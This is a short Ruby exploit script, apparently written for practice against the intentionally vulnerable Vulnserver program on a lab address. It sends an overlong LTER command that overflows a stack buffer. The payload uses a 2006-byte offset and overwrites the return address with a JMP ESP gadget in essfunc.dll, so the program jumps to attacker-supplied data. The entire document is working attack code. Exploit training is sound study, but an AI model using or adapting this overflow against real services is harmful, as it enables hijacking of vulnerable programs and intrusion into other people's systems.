#!/usr/bin/env ruby

require 'socket'

# host = "192.168.0.78" # ARGV[0]
# port = "9999" # ARGV[1]

badHeader = "LTER ."
badData = "\x41" * 2006 # Offset is 2006
badData += "\x03\x12\x50\x62" # Memory Address 0x62501203; # JMP ESP, essfunc.dll
badData += "\x42" * (3000 - badData.size)

# Config Socket
socket = TCPSocket.open '192.168.0.78', 9999
socket.recv(1024)
socket.send(badHeader + badData, 0)
socket.close